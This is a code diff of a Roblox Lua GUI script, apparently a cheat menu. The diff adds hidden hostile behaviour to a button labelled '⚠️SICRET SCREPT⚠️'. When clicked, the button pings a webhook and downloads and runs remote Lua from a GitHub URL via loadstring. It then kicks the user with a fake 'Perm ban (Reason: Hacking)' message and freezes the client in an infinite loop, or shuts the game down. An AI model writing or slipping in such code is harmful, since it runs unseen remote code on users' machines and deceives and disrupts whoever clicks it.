@@ -725,12 +725,12 @@ GuiTab:CreateButton({
     end,
 })
 
-GuiTab:CreateButton({
+--[[GuiTab:CreateButton({
     Name = "Executor",
     Callback = function()
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/executor.lua"))()
     end,
-})
+})]]
 
 GuiTab:CreateButton({
     Name = "⚠️SICRET SCREPT⚠️",
@@ -779,13 +779,16 @@ SendMessage(url, "💀BRO CLICKED IT RIP💀")
                     Duration = 3
                 })
                 task.wait(60)
-
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/RipBro.lua.txt"))()
+                task.wait(1)
                 game.Players.LocalPlayer:Kick("Perm ban (Reason: Hacking)")
 
                 task.wait(1.5)
                 while true do end
             elseif Secret == "NAH UH" then
                 task.wait(60)
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/RipBro.lua.txt"))()
+                task.wait()
                 game:Shutdown()
             end
         end
